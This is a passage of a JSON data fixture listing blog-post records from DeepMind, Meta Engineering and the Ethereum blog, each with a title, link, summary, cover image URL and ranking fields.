[]}}, {"model": "app.post", "pk": 233, "fields": {"title": "Generally capable agents emerge from open-ended play", "link": "https://www.deepmind.com/blog/generally-capable-agents-emerge-from-open-ended-play", "source": 1, "normalized_link": "www.deepmind.com/blog/generally-capable-agents-emerge-from-open-ended-play", "summary": "In recent years, artificial intelligence agents have succeeded in a range of complex game environments. For instance, AlphaZero beat world-champion programs in chess, shogi, and Go after starting out with knowing no more than the basic rules of how to play. Through reinforcement learning (RL), this single system learnt by playing round after round of games through a repetitive process of trial and error. But AlphaZero still trained separately on each game \u2014 unable to simply learn another game or task without repeating the RL process from scratch. The same is true for other successes of RL, such as Atari, Capture the Flag, StarCraft II, Dota 2, and Hide-and-Seek. DeepMind\u2019s mission of solving intelligence to advance science and humanity led us to explore how we could overcome this limitation to create AI agents with more general and adaptive behaviour. Instead of learning one game at a time, these agents would be able to react to completely new conditions and play a whole universe of games and tasks, including ones never seen before.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6227d8684cf99373883ff46c_Adaptive%20Agents.jpg", "profile": 8, "updated_on": "2021-07-27T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10962.8787411, "slug": "generally-capable-agents-emerge-from-open-ended-play-233", "topics": []}}, {"model": "app.post", "pk": 234, "fields": {"title": "Putting the power of AlphaFold into the world\u2019s hands", "link": "https://www.deepmind.com/blog/putting-the-power-of-alphafold-into-the-worlds-hands", "source": 1, "normalized_link": "www.deepmind.com/blog/putting-the-power-of-alphafold-into-the-worlds-hands", "summary": "When we announced AlphaFold 2 last December, it was hailed as a solution to the 50-year old protein folding problem. Last week, we published the scientific paper and source code explaining how we created this highly innovative system, and today we\u2019re sharing high-quality predictions for the shape of every single protein in the human body, as well as for the proteins of 20 additional organisms that scientists rely on for their research.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6227acecdfd38b08b555c6b3_AF2.jpg", "profile": 8, "updated_on": "2021-07-22T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10953.2787411, "slug": "putting-the-power-of-alphafold-into-the-worlds-hands-234", "topics": []}}, {"model": "app.post", "pk": 235, "fields": {"title": "Enabling high-accuracy protein structure prediction at the proteome scale", "link": "https://www.deepmind.com/blog/enabling-high-accuracy-protein-structure-prediction-at-the-proteome-scale", "source": 1, "normalized_link": "www.deepmind.com/blog/enabling-high-accuracy-protein-structure-prediction-at-the-proteome-scale", "summary": "Many novel machine learning innovations contribute to AlphaFold\u2019s current level of accuracy. We give a high-level overview of the system below; for a technical description of the network architecture see our AlphaFold methods paper and especially its extensive Supplementary Information.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-07-22T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10953.2787411, "slug": "enabling-high-accuracy-protein-structure-prediction-at-the-proteome-scale-235", "topics": []}}, {"model": "app.post", "pk": 236, "fields": {"title": "Melting Pot: an evaluation suite for multi-agent reinforcement learning", "link": "https://www.deepmind.com/blog/melting-pot-an-evaluation-suite-for-multi-agent-reinforcement-learning", "source": 1, "normalized_link": "www.deepmind.com/blog/melting-pot-an-evaluation-suite-for-multi-agent-reinforcement-learning", "summary": "Here we introduce Melting Pot, a scalable evaluation suite for multi-agent reinforcement learning. Melting Pot assesses generalisation to novel social situations involving both familiar and unfamiliar individuals, and has been designed to test a broad range of social interactions such as: cooperation, competition, deception, reciprocation, trust, stubbornness and so on. Melting Pot offers researchers a set of 21 MARL \u201csubstrates\u201d (multi-agent games) on which to train agents, and over 85 unique test scenarios on which to evaluate these trained agents.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-07-14T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10937.9187411, "slug": "melting-pot-an-evaluation-suite-for-multi-agent-reinforcement-learning-236", "topics": []}}, {"model": "app.post", "pk": 237, "fields": {"title": "An update on our racial justice efforts", "link": "https://www.deepmind.com/blog/an-update-on-our-racial-justice-efforts", "source": 1, "normalized_link": "www.deepmind.com/blog/an-update-on-our-racial-justice-efforts", "summary": "In June 2020, after George Floyd was killed in Minneapolis (USA) and the solidarity that followed as millions spoke out at Black Lives Matter protests around the world, I \u2013 like many others \u2013 reflected on the situation and how our organisation could contribute. I then shared some thoughts around DeepMind's intention to help combat racism and advance racial equity.", "content": "", "cover_photo_url": "https://storage.googleapis.com/deepmind-media/DeepMind.com/Blog/an-update-on-our-racial-justice-efforts/Black_Thrive_Global_01.png", "profile": 8, "updated_on": "2021-06-04T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10861.1187411, "slug": "an-update-on-our-racial-justice-efforts-237", "topics": []}}, {"model": "app.post", "pk": 238, "fields": {"title": "Advancing sports analytics through AI research", "link": "https://www.deepmind.com/blog/advancing-sports-analytics-through-ai-research", "source": 1, "normalized_link": "www.deepmind.com/blog/advancing-sports-analytics-through-ai-research", "summary": "Creating testing environments to help progress AI research out of the lab and into the real world is immensely challenging. Given AI\u2019s long association with games, it is perhaps no surprise that sports presents an exciting opportunity, offering researchers a testbed in which an AI-enabled system can assist humans in making complex, real-time decisions in a multiagent environment with dozens of dynamic, interacting individuals.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62279f7765e1f7e532885bde_Sports%20Analytics.jpg", "profile": 8, "updated_on": "2021-05-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10807.3587411, "slug": "advancing-sports-analytics-through-ai-research-238", "topics": []}}, {"model": "app.post", "pk": 239, "fields": {"title": "Game theory as an engine for large-scale data analysis", "link": "https://www.deepmind.com/blog/game-theory-as-an-engine-for-large-scale-data-analysis", "source": 1, "normalized_link": "www.deepmind.com/blog/game-theory-as-an-engine-for-large-scale-data-analysis", "summary": "Modern AI systems approach tasks like recognising objects in images and predicting the 3D structure of proteins as a diligent student would prepare for an exam. By training on many example problems, they minimise their mistakes over time until they achieve success. But this is a solitary endeavour and only one of the known forms of learning. Learning also takes place by interacting and playing with others. It\u2019s rare that a single individual can solve extremely complex problems alone. By allowing problem solving to take on these game-like qualities, previous DeepMind efforts have trained AI agents to play Capture the Flag and achieve Grandmaster level at Starcraft. This made us wonder if such a perspective modeled on game theory could help solve other fundamental machine learning problems.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6227816aa37c04f007d9d960_EigenGame.jpg", "profile": 8, "updated_on": "2021-05-06T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10805.4387411, "slug": "game-theory-as-an-engine-for-large-scale-data-analysis-239", "topics": []}}, {"model": "app.post", "pk": 240, "fields": {"title": "Alchemy: A structured task distribution for meta-reinforcement learning", "link": "https://www.deepmind.com/blog/alchemy-a-structured-task-distribution-for-meta-reinforcement-learning", "source": 1, "normalized_link": "www.deepmind.com/blog/alchemy-a-structured-task-distribution-for-meta-reinforcement-learning", "summary": "There has been rapidly growing interest in developing methods for meta-learning within deep RL. Although there has been substantive progress toward such \u2018meta-reinforcement learning,\u2019 research in this area has been held back by a shortage of benchmark tasks. In the present work, we aim to ease this problem by introducing (and open-sourcing) Alchemy, a useful new benchmark environment for meta-RL, along with a suite of analysis tools.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-02-08T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10638.3987411, "slug": "alchemy-a-structured-task-distribution-for-meta-reinforcement-learning-240", "topics": []}}, {"model": "app.post", "pk": 241, "fields": {"title": "Data, Architecture, or Losses: What Contributes Most to Multimodal Transformer Success?", "link": "https://www.deepmind.com/blog/data-architecture-or-losses-what-contributes-most-to-multimodal-transformer-success", "source": 1, "normalized_link": "www.deepmind.com/blog/data-architecture-or-losses-what-contributes-most-to-multimodal-transformer-success", "summary": "In this work, we examine what aspects of multimodal transformers \u2013 attention, losses, and pretraining data \u2013 are important in their success at multimodal pretraining. We find that Multimodal attention, where both language and image transformers attend to each other, is crucial for these models\u2019 success. Models with other types of attention (even with more depth or parameters) fail to achieve comparable results to shallower and smaller models with multimodal attention.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-02-02T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10626.8787411, "slug": "data-architecture-or-losses-what-contributes-most-to-multimodal-transformer-success-241", "topics": []}}, {"model": "app.post", "pk": 242, "fields": {"title": "MuZero: Mastering Go, chess, shogi and Atari without rules", "link": "https://www.deepmind.com/blog/muzero-mastering-go-chess-shogi-and-atari-without-rules", "source": 1, "normalized_link": "www.deepmind.com/blog/muzero-mastering-go-chess-shogi-and-atari-without-rules", "summary": "In 2016, we introduced AlphaGo, the first artificial intelligence (AI) program to defeat humans at the ancient game of Go. Two years later, its successor - AlphaZero - learned from scratch to master Go, chess and shogi. Now, in a paper in the journal Nature, we describe MuZero, a significant step forward in the pursuit of general-purpose algorithms. MuZero masters Go, chess, shogi and Atari without needing to be told the rules, thanks to its ability to plan winning strategies in unknown environments.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62277efc7b7dddc5c1c7ac8f_MuZero.jpg", "profile": 8, "updated_on": "2020-12-23T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10548.1587411, "slug": "muzero-mastering-go-chess-shogi-and-atari-without-rules-242", "topics": []}}, {"model": "app.post", "pk": 243, "fields": {"title": "Imitating Interactive Intelligence", "link": "https://www.deepmind.com/blog/imitating-interactive-intelligence", "source": 1, "normalized_link": "www.deepmind.com/blog/imitating-interactive-intelligence", "summary": "We first create a simulated environment, the Playroom, in which virtual robots can engage in a variety of interesting interactions by moving around, manipulating objects, and speaking to each other. The Playroom\u2019s dimensions can be randomised as can its allocation of shelves, furniture, landmarks like windows and doors, and an assortment of children's toys and domestic objects. The diversity of the environment enables interactions involving reasoning about space and object relations, ambiguity of references, containment, construction, support, occlusion, partial observability. We embedded two agents in the Playroom to provide a social dimension for studying joint intentionality, cooperation, communication of private knowledge, and so on.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2020-12-11T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10525.1187411, "slug": "imitating-interactive-intelligence-243", "topics": []}}, {"model": "app.post", "pk": 244, "fields": {"title": "Using JAX to accelerate our research", "link": "https://www.deepmind.com/blog/using-jax-to-accelerate-our-research", "source": 1, "normalized_link": "www.deepmind.com/blog/using-jax-to-accelerate-our-research", "summary": "DeepMind engineers accelerate our research by building tools, scaling up algorithms, and creating challenging virtual and physical worlds for training and testing artificial intelligence (AI) systems. As part of this work, we constantly evaluate new machine learning libraries and frameworks.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62277de6e5d933b07c0a6039_Optax.gif", "profile": 8, "updated_on": "2020-12-04T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10511.6787411, "slug": "using-jax-to-accelerate-our-research-244", "topics": []}}, {"model": "app.post", "pk": 245, "fields": {"title": "AlphaFold: a solution to a 50-year-old grand challenge in biology", "link": "https://www.deepmind.com/blog/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology", "source": 1, "normalized_link": "www.deepmind.com/blog/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology", "summary": "Proteins are essential to life, supporting practically all its functions. They are large complex molecules, made up of chains of amino acids, and what a protein does largely depends on its unique 3D structure. Figuring out what shapes proteins fold into is known as the \u201cprotein-folding problem\u201d, and has stood as a grand challenge in biology for the past 50 years. In a major scientific advance, the latest version of our AI system AlphaFold has been recognised as a solution to this grand challenge by the organisers of the biennial Critical Assessment of protein Structure Prediction (CASP). This breakthrough demonstrates the impact AI can have on scientific discovery and its potential to dramatically accelerate progress in some of the most fundamental fields that explain and shape our world.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62277bb0a0b933ae0003d7e2_AF01.jpg", "profile": 8, "updated_on": "2020-11-30T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10503.9987411, "slug": "alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology-245", "topics": []}}, {"model": "app.post", "pk": 246, "fields": {"title": "Using Unity to Help Solve Intelligence", "link": "https://www.deepmind.com/blog/using-unity-to-help-solve-intelligence", "source": 1, "normalized_link": "www.deepmind.com/blog/using-unity-to-help-solve-intelligence", "summary": "We present our use of Unity, a widely recognised and comprehensive game engine, to create more diverse, complex, virtual simulations. We describe the concepts and components developed to simplify the authoring of these environments, intended for use predominantly in the field of reinforcement learning.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2020-11-18T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10480.9587411, "slug": "using-unity-to-help-solve-intelligence-246", "topics": []}}, {"model": "app.post", "pk": 247, "fields": {"title": "Breaking down global barriers to access", "link": "https://www.deepmind.com/blog/breaking-down-global-barriers-to-access", "source": 1, "normalized_link": "www.deepmind.com/blog/breaking-down-global-barriers-to-access", "summary": "This week, we welcomed our biggest and most geographically diverse cohort of DeepMind scholars yet. We\u2019re excited to reflect on the journey so far, share more on the next chapter of the DeepMind scholarships \u2013 and welcome many more universities from around the world into the programme.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62277a7a7ecf712d92766e1d_Scholarships%20copy.jpg", "profile": 8, "updated_on": "2020-11-05T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10455.9987411, "slug": "breaking-down-global-barriers-to-access-247", "topics": []}}, {"model": "app.post", "pk": 248, "fields": {"title": "FermiNet: Quantum Physics and Chemistry from First Principles", "link": "https://www.deepmind.com/blog/ferminet-quantum-physics-and-chemistry-from-first-principles", "source": 1, "normalized_link": "www.deepmind.com/blog/ferminet-quantum-physics-and-chemistry-from-first-principles", "summary": "In an article recently published in Physical Review Research, we show how deep learning can help solve the fundamental equations of quantum mechanics for real-world systems. Not only is this an important fundamental scientific question, but it also could lead to practical uses in the future, allowing researchers to prototype new materials and chemical syntheses in silico before trying to make them in the lab. Today we are also releasing the code from this study so that the computational physics and chemistry communities can build on our work and apply it to a wide range of problems. We\u2019ve developed a new neural network architecture, the Fermionic Neural Network or FermiNet, which is well-suited to modeling the quantum state of large collections of electrons, the fundamental building blocks of chemical bonds. The FermiNet was the first demonstration of deep learning for computing the energy of atoms and molecules from first principles that was accurate enough to be useful, and it remains the most accurate neural network method to date. We hope the tools and ideas developed in our AI research at DeepMind can help solve fundamental problems in the natural sciences, and the FermiNet joins our work on protein folding, glassy dynamics, lattice quantum chromodynamics and many other projects in bringing that vision to life.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62275e8c567d38563c2b9621_FermiNet.jpg", "profile": 8, "updated_on": "2020-10-19T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10423.3587411, "slug": "ferminet-quantum-physics-and-chemistry-from-first-principles-248", "topics": []}}, {"model": "app.post", "pk": 249, "fields": {"title": "Fast reinforcement learning through the composition of behaviours", "link": "https://www.deepmind.com/blog/fast-reinforcement-learning-through-the-composition-of-behaviours", "source": 1, "normalized_link": "www.deepmind.com/blog/fast-reinforcement-learning-through-the-composition-of-behaviours", "summary": "Imagine if you had to learn how to chop, peel and stir all over again every time you wanted to learn a new recipe. In many machine learning systems, agents often have to learn entirely from scratch when faced with new challenges. It\u2019s clear, however, that people learn more efficiently than this: they can combine abilities previously learned. In the same way that a finite dictionary of words can be reassembled into sentences of near infinite meanings, people repurpose and re-combine skills they already possess in order to tackle novel challenges.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62275c5b4fecbb44e25e2f2e_Fast%20RL.jpg", "profile": 8, "updated_on": "2020-10-12T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10409.9187411, "slug": "fast-reinforcement-learning-through-the-composition-of-behaviours-249", "topics": []}}, {"model": "app.post", "pk": 250, "fields": {"title": "Scaling the Instagram Explore recommendations system", "link": "https://engineering.fb.com/2023/08/09/ml-applications/scaling-instagram-explore-recommendations-system/", "source": 1, "normalized_link": "engineering.fb.com/2023/08/09/ml-applications/scaling-instagram-explore-recommendations-system", "summary": "Explore is one of the largest recommendation systems on Instagram. We leverage machine learning to make sure people are always seeing content that is the most interesting and relevant to them. Using more advanced machine learning models, like Two Towers neural networks, we\u2019ve been able to make the Explore recommendation system even more scalable and [...] Read More... The post Scaling the Instagram Explore recommendations system appeared first on Engineering at Meta.", "content": "", "cover_photo_url": "https://engineering.fb.com/wp-content/uploads/2023/08/Instagram-Explore-Ranking_HERO.png", "profile": 11, "updated_on": "2023-08-09T16:00:52Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12390.7198967, "slug": "scaling-the-instagram-explore-recommendations-system-250", "topics": [63, 64]}}, {"model": "app.post", "pk": 251, "fields": {"title": "How Meta is improving password security and preserving privacy", "link": "https://engineering.fb.com/2023/08/08/security/how-meta-is-improving-password-security-and-preserving-privacy/", "source": 1, "normalized_link": "engineering.fb.com/2023/08/08/security/how-meta-is-improving-password-security-and-preserving-privacy", "summary": "Meta is developing new privacy-enhancing technologies (PETs) to innovate and solve problems with less data. These technologies enable teams to build and launch privacy-enhanced products in a way that\u2019s verifiable and safeguards user data. Using state-of-the-art cryptographic techniques, we have developed Private Data Lookup (PDL) that allows users to privately query a server-side data set. [...] Read More... The post How Meta is improving password security and preserving privacy appeared first on Engineering at Meta.", "content": "", "cover_photo_url": "https://engineering.fb.com/wp-content/uploads/2023/08/Eng-Blog-Self-Serve-Hero-Images-PRIVACY-103-Blue-x2.jpg", "profile": 11, "updated_on": "2023-08-08T16:00:55Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12388.7999633, "slug": "how-meta-is-improving-password-security-and-preserving-privacy-251", "topics": [65]}}, {"model": "app.post", "pk": 252, "fields": {"title": "Fixit 2: Meta\u2019s next-generation auto-fixing linter", "link": "https://engineering.fb.com/2023/08/07/developer-tools/fixit-2-linter-meta/", "source": 1, "normalized_link": "engineering.fb.com/2023/08/07/developer-tools/fixit-2-linter-meta", "summary": "Fixit is dead! Long live Fixit 2 \u2013 the latest version of our open-source auto-fixing linter. Fixit 2 allows developers to efficiently build custom lint rules and perform auto-fixes for their codebases. Fixit 2 is available today on PyPI. Python is one of the most popular languages in use at Meta. Meta\u2019s production engineers (PEs) [...] Read More... The post Fixit 2: Meta\u2019s next-generation auto-fixing linter appeared first on Engineering at Meta.", "content": "", "cover_photo_url": "https://engineering.fb.com/wp-content/uploads/2022/07/Eng-Blog-Self-Serve-Hero-Images-DEBUGGING-203-Teale-1.jpg", "profile": 11, "updated_on": "2023-08-07T16:00:09Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12386.8789411, "slug": "fixit-2-metas-next-generation-auto-fixing-linter-252", "topics": [66, 67, 4, 64]}}, {"model": "app.post", "pk": 253, "fields": {"title": "Using short-lived certificates to protect TLS secrets", "link": "https://engineering.fb.com/2023/08/07/security/short-lived-certificates-protect-tls-secrets/", "source": 1, "normalized_link": "engineering.fb.com/2023/08/07/security/short-lived-certificates-protect-tls-secrets", "summary": "Short-lived certificates (SLCs) are part of our latest efforts to further secure our Transport Layer Security (TLS) private keys on our edge networks. SLCs have a very short exposure compared to traditional certificates and lower the chances of a compromised private key being abused. Implementing SLCs has required us to address tradeoffs between operability and [...] Read More... The post Using short-lived certificates to protect TLS secrets appeared first on Engineering at Meta.", "content": "", "cover_photo_url": "https://engineering.fb.com/wp-content/uploads/2023/08/Eng-Blog-Self-Serve-Hero-Images-PRIVACY-103-Navy-1.jpg", "profile": 11, "updated_on": "2023-08-07T13:00:57Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12386.6400078, "slug": "using-short-lived-certificates-to-protect-tls-secrets-253", "topics": [67, 65]}}, {"model": "app.post", "pk": 254, "fields": {"title": "Bringing HDR video to Reels", "link": "https://engineering.fb.com/2023/07/17/video-engineering/hdr-video-reels-meta/", "source": 1, "normalized_link": "engineering.fb.com/2023/07/17/video-engineering/hdr-video-reels-meta", "summary": "Meta has made it possible for people to upload high dynamic range (HDR) videos from their phone\u2019s camera roll to Reels on Facebook and Instagram. To show standard dynamic range (SDR) UI elements and overlays legibly on top of HDR video, we render them at a brightness level comparable to the video itself. We solved [...] Read More... The post Bringing HDR video to Reels appeared first on Engineering at Meta.", "content": "", "cover_photo_url": "https://engineering.fb.com/wp-content/uploads/2023/06/CC23_021-Visual-1_Hero.png", "profile": 11, "updated_on": "2023-07-17T16:00:15Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12346.5590744, "slug": "bringing-hdr-video-to-reels-254", "topics": [69, 39, 68, 64]}}, {"model": "app.post", "pk": 255, "fields": {"title": "Meta\u2019s Evenstar is transitioning to OCP to accelerate open RAN adoption", "link": "https://engineering.fb.com/2023/06/29/connectivity/evenstar-meta-ocp-open-ran/", "source": 1, "normalized_link": "engineering.fb.com/2023/06/29/connectivity/evenstar-meta-ocp-open-ran", "summary": "Meta is transferring its IP for Evenstar, a program to accelerate the adoption of open RAN technologies, to the Open Compute Project (OCP). Meta will contribute Evenstar\u2019s radio unit design to OCP, giving the telecom industry its first open, white box radio unit solution. The TIP Open RAN community will leverage the Evenstar radio unit [...] Read More... The post Meta\u2019s Evenstar is transitioning to OCP to accelerate open RAN adoption appeared first on Engineering at Meta.", "content": "", "cover_photo_url": "https://engineering.fb.com/wp-content/uploads/2020/12/evenstar_hero.jpg", "profile": 11, "updated_on": "2023-06-29T16:00:13Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12311.99903, "slug": "metas-evenstar-is-transitioning-to-ocp-to-accelerate-open-ran-adoption-255", "topics": [70, 71, 4]}}, {"model": "app.post", "pk": 256, "fields": {"title": "Meta developer tools: Working at scale", "link": "https://engineering.fb.com/2023/06/27/developer-tools/meta-developer-tools-open-source/", "source": 1, "normalized_link": "engineering.fb.com/2023/06/27/developer-tools/meta-developer-tools-open-source", "summary": "Every day, thousands of developers at Meta are working in repositories with millions of files. Those developers need tools that help them at every stage of the workflow while working at extreme scale. In this article we\u2019ll go through a few of the tools in the development process. And, as an added bonus, those we [...] Read More... The post Meta developer tools: Working at scale appeared first on Engineering at Meta.", "content": "", "cover_photo_url": "https://engineering.fb.com/wp-content/uploads/2023/06/Dev-Workflow-1848x1200-Full.jpg", "profile": 11, "updated_on": "2023-06-27T16:00:51Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12308.1598744, "slug": "meta-developer-tools-working-at-scale-256", "topics": [66, 4]}}, {"model": "app.post", "pk": 257, "fields": {"title": "Bombyx is being licensed for product development", "link": "https://engineering.fb.com/2023/05/22/connectivity/bombyx-meta-fiber-deployment-robot-product-development/", "source": 1, "normalized_link": "engineering.fb.com/2023/05/22/connectivity/bombyx-meta-fiber-deployment-robot-product-development", "summary": "When we first conceived of our aerial fiber deployment solution, Bombyx (the Latin name for a silk moth), we imagined a robot weaving strands of fiber-optic cables over powerlines, helping human workers quickly connect communities even in very rural or remote locations. Now, after years of successful research, Bombyx is taking the next steps in [...] Read More... The post Bombyx is being licensed for product development appeared first on Engineering at Meta.", "content": "", "cover_photo_url": "https://engineering.fb.com/wp-content/uploads/2023/05/Bombyx_Hibot-HERO.png", "profile": 11, "updated_on": "2023-05-22T16:00:37Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12239.0395633, "slug": "bombyx-is-being-licensed-for-product-development-257", "topics": [70]}}, {"model": "app.post", "pk": 258, "fields": {"title": "MSVP is Meta\u2019s first video processing ASIC", "link": "https://ai.facebook.com/blog/meta-scalable-video-processor-MSVP", "source": 1, "normalized_link": "ai.facebook.com/blog/meta-scalable-video-processor-MSVP", "summary": " [...] Read More... The post MSVP is Meta\u2019s first video processing ASIC appeared first on Engineering at Meta.", "content": "", "cover_photo_url": "https://scontent.flhr11-1.fna.fbcdn.net/v/t39.2365-6/347446471_776886030713409_5593689425406252142_n.jpg?_nc_cat=107&ccb=1-7&_nc_sid=e280be&_nc_ohc=JTgTceyRongAX-ypvDI&_nc_ht=scontent.flhr11-1.fna&oh=00_AfDhUe1yJJi9JGQsM9advOO1X6UZ8vIIF6XxKnzkZxKgog&oe=64F25D48", "profile": 11, "updated_on": "2023-05-18T18:39:38Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12231.5715856, "slug": "msvp-is-metas-first-video-processing-asic-258", "topics": [63, 69]}}, {"model": "app.post", "pk": 259, "fields": {"title": "Devconnect Istanbul Cowork Tickets Are Live!", "link": "https://blog.ethereum.org/en/2023/08/08/devconnect-ist-cowork-tickets", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/08/08/devconnect-ist-cowork-tickets", "summary": "Greetings, Ethereum builders and enthusiasts!  We're thrilled to announce that ticket sales for the Devconnect Cowork in Istanbul are now open! \ud83e\udd73  You can get your tickets here,and also see that our website got a fresh new makeover! \ud83d\udc85  Come back here right after you snagged your...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_af9f0f6bf59a8d67f6a8eef94f974113.jpg", "profile": 10, "updated_on": "2023-08-08T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12387.5187411, "slug": "devconnect-istanbul-cowork-tickets-are-live-259", "topics": [73, 72]}}, {"model": "app.post", "pk": 260, "fields": {"title": "The Human Stories of Ethereum - Meet the Next Billion Fellows Cohort 3", "link": "https://blog.ethereum.org/en/2023/08/07/nb-fellows-cohort-3", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/08/07/nb-fellows-cohort-3", "summary": "As we look at our world, it seems that individual humans are increasingly on the edges and in the margins of the big stories that play out on our scrolling screens. The narratives that captivate and resonate with ordinary folks seem to exist at a scale beyond the reach of...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_bc451adb280fe2de40c39e1246ddd6db.png", "profile": 10, "updated_on": "2023-08-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12385.5987411, "slug": "the-human-stories-of-ethereum-meet-the-next-billion-fellows-cohort-3-260", "topics": [74]}}, {"model": "app.post", "pk": 261, "fields": {"title": "KZG Ceremony Special Contributions", "link": "https://blog.ethereum.org/en/2023/08/02/kzg-special-contributions", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/08/02/kzg-special-contributions", "summary": "The Special Contribution Period for the KZG Ceremony ran  01-16 April 2023. This allowed participants to contribute in ways that may not have been possible in the Open Contribution period. While the Ceremony only needs a single honest participant to provide a secure output, Special Contributions provide additional assurances...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_b8f57609d139ce61f1c708e50f6d4809.png", "profile": 10, "updated_on": "2023-08-02T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12375.9987411, "slug": "kzg-ceremony-special-contributions-261", "topics": [75]}}, {"model": "app.post", "pk": 262, "fields": {"title": "Announcing The Road To Devcon Grants", "link": "https://blog.ethereum.org/en/2023/06/29/road-to-devcon7-grants", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/06/29/road-to-devcon7-grants", "summary": "Devcon 7 is scheduled for 2024, and while the final location is still TBA, we can say one thing with certainty: Devcon is coming to Southeast Asia! \ud83c\udf0f  We can\u2019t wait for our journey to Devcon 7 in Southeast Asia to begin and are happy to see that the...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_26ffe228bf48549e6c75df1a0cb26836.png", "profile": 10, "updated_on": "2023-06-29T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12310.7187411, "slug": "announcing-the-road-to-devcon-grants-262", "topics": [72, 76]}}, {"model": "app.post", "pk": 263, "fields": {"title": "Academic Grants Round 2023 Announcement", "link": "https://blog.ethereum.org/en/2023/06/28/academic-grants-round-23", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/06/28/academic-grants-round-23", "summary": "We are excited to announce the recipients of this year's Academic Grants Round. We received more than 250 applications and have awarded over $2 million in funding to 43 projects across several categories.  The awarded teams are distributed all across the globe with researchers from Austria, Australia, Canada, China,...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_bf942aa10b05ae61cf7db99dca5c5470.png", "profile": 10, "updated_on": "2023-06-28T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 